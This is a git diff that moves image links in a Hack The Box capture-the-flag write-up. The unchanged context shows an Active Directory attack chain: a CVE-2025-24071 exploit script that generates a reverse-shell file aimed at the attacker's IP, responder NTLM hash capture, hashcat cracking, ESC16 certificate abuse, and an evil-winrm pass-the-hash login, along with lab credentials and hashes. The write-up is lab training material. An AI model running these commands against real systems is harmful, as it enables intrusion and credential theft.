@@ -91,34 +91,34 @@ smb: \> mget *
 
 We got a bunch of files on here, most of them didn't have much relevant information but we can find this on the pdf file:
 
-![](Pasted%20image%2020250606131829.png)
+![](images/Pasted%20image%2020250606131829.png)
 
 
-![](Pasted%20image%2020250606131844.png)
+![](images/Pasted%20image%2020250606131844.png)
 
 
 It is saying that a patch will be done for those CVE's, it would be a nice approach to check them out as they may haven't been patched yet:
 
-![](Pasted%20image%2020250606132002.png)
+![](images/Pasted%20image%2020250606132002.png)
 
-![](Pasted%20image%2020250606132018.png)
-
-
-![](Pasted%20image%2020250606132036.png)
-
-![](Pasted%20image%2020250606132056.png)
+![](images/Pasted%20image%2020250606132018.png)
 
 
-![](Pasted%20image%2020250606132126.png)
+![](images/Pasted%20image%2020250606132036.png)
+
+![](images/Pasted%20image%2020250606132056.png)
 
 
-![](Pasted%20image%2020250606132158.png)
+![](images/Pasted%20image%2020250606132126.png)
+
+
+![](images/Pasted%20image%2020250606132158.png)
 
 We got a bunch of `CVE's` one interesting one is the `CVE-2025-24071` we can read this description on the following GitHub repository:
 
 Repo: https://github.com/ThemeHackers/CVE-2025-24071
 
-![](Pasted%20image%2020250606132807.png)
+![](images/Pasted%20image%2020250606132807.png)
 
 
 That means we can get the NTLM hash of an user, before doing all this, let's continue our enumeration:
@@ -167,7 +167,7 @@ We will get a `.zip` file we can use on bloodhound:
 
 
 
-![](Pasted%20image%2020250606141055.png)
+![](images/Pasted%20image%2020250606141055.png)
 
 
 We got some users:
@@ -178,16 +178,16 @@ p.agila
 ```
 
 
-![](Pasted%20image%2020250606141802.png)
+![](images/Pasted%20image%2020250606141802.png)
 
 
 As seen, `p.agila` and `j.coffey` are members of `service account managers` which has `GenericAll` over `service accounts`:
 
-![](Pasted%20image%2020250606141906.png)
+![](images/Pasted%20image%2020250606141906.png)
 
 Service accounts has got `GenericWrite` over those accounts, let's check `ca_svc`:
 
-![](Pasted%20image%2020250606142240.png)
+![](images/Pasted%20image%2020250606142240.png)
 
 
 Nice, knowing all this, we can begin with our attack path, let's proceed to exploitation to explain it.
@@ -224,7 +224,7 @@ We will need `responder` to perform the hash capture:
 python3 exploit.py -i TUN0_IP -f revshell
 ```
 
-![](Pasted%20image%2020250606144452.png)
+![](images/Pasted%20image%2020250606144452.png)
 
 Now, we need to set up responder and upload the file into smb:
 
@@ -233,7 +233,7 @@ sudo responder -I tun0 -v
 smbclient //10.10.11.69/IT -U j.fleischman%J0elTHEM4n1990! -c "put exploit.zip"
 ```
 
-![](Pasted%20image%2020250606144808.png)
+![](images/Pasted%20image%2020250606144808.png)
 
 There we go, as seen, we get the hash, we can crack it with `hashcat`:
 
@@ -247,7 +247,7 @@ hashcat -m 5600 -a 0 p_agila_hash.txt /usr/share/wordlists/rockyou.txt
 
 We get this:
 
-![](Pasted%20image%2020250606145038.png)
+![](images/Pasted%20image%2020250606145038.png)
 
 Got our password:
 
@@ -393,10 +393,10 @@ We are dealing with `ESC16`, checking on the internet on how to exploit this, I 
 
 Post: https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6
 
-![](Pasted%20image%2020250606151949.png)
+![](images/Pasted%20image%2020250606151949.png)
 
 
-![](Pasted%20image%2020250606152007.png)
+![](images/Pasted%20image%2020250606152007.png)
 
 
 With this in our hands, let's begin privilege escalation.
@@ -480,7 +480,7 @@ evil-winrm -i 10.10.11.69 -u administrator -H '8da83a3fa618b6e3a00e93f676c92a6e'
 ```
 
 
-![](Pasted%20image%2020250606152511.png)
+![](images/Pasted%20image%2020250606152511.png)
 
 We can now read both flags:
 
@@ -494,5 +494,5 @@ e672962e9a5076674107c865597e5699
 
 https://www.hackthebox.com/achievement/machine/1872557/662
 
-![](Pasted%20image%2020250606152658.png)
+![](images/Pasted%20image%2020250606152658.png)
 
